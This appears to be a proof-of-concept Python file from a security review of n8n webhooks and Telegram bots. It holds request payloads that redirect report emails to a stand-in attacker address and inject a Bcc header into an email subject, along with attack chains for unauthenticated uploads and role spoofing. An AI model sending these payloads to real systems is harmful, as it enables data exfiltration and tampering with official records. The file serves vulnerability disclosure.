#!/usr/bin/env python3
"""PoC sketches for unauthenticated n8n webhooks + Telegram no-allowlist.

These are request shapes matching SKILL.md sample workflows (no live target).
"""
from __future__ import annotations
import json

DAILY_REPORT = {
    "url": "https://n8n.example/webhook/daily-report-data",
    "json": {
        "project_id": "ATTACKER_CONTROLLED_PROCORE_PROJECT",
        "project_name": "Poisoned Daily Report",
        "site_lat": 0,
        "site_lon": 0,
        "distribution_list": "attacker@evil.example",
    },
    "sinks": [
        "httpRequest Procore OAuth GET .../projects/{project_id}/images",
        "emailSend toEmail=$json.distribution_list",
        "SharePoint upload /Daily Reports/{date}",
    ],
}

PHOTO_UPLOAD = {
    "url": "https://n8n.example/webhook/photo-upload",
    "json": {
        "filename": "fake_safety.jpg",
        "image_data": "<base64>",
        "project_id": "any",
    },
    "sinks": [
        "Anthropic Vision with company API key",
        "Airtable create Site Photos (official record)",
        "feeds scheduled email report of safety issues",
    ],
}

RFI_NOTIFY = {
    "url": "https://n8n.example/webhook/rfi-notification",
    "json": {
        "rfi_number": "RFI-9999",
        "subject": "Urgent\r\nBcc: attacker@evil.example",
        "assigned_to": "Architect",
        "date_required": "2026-11-02",
        "priority": "High",
    },
    "sinks": [
        "Google Sheets Contacts lookup by role",
        "Email to matched staff",
        "Telegram to matched telegram_id",
    ],
}

TELEGRAM_FIELD = {
    "skill": "telegram-field-bot",
    "chain": [
        "Anyone who knows bot username sends photo/text",
        "No ALLOWED_USER_IDS / chat allowlist in Application handlers",
        "n8n path: Telegram Trigger → PostgreSQL insert",
        "generate_daily_report aggregates telegram_reports into official daily summary",
    ],
}

PROJECT_MGMT_FOREMAN = {
    "skill": "n8n-project-management",
    "chain": [
        "Telegram /start → self-assert name + role including Прораб (Foreman)",
        "Workers.Telegram_ID documented as User ID from /start",
        "No invite token / admin approval / allowlist in sample workflow",
        "Roster pollution → PM assigns Executor_ID → attacker receives tasks / submits official status+photos",
    ],
}

if __name__ == "__main__":
    for name, obj in [
        ("daily-report", DAILY_REPORT),
        ("photo-upload", PHOTO_UPLOAD),
        ("rfi-notification", RFI_NOTIFY),
        ("telegram-field-bot", TELEGRAM_FIELD),
        ("n8n-project-management", PROJECT_MGMT_FOREMAN),
    ]:
        print("==", name, "==")
        print(json.dumps(obj, indent=2, ensure_ascii=False))
        print()
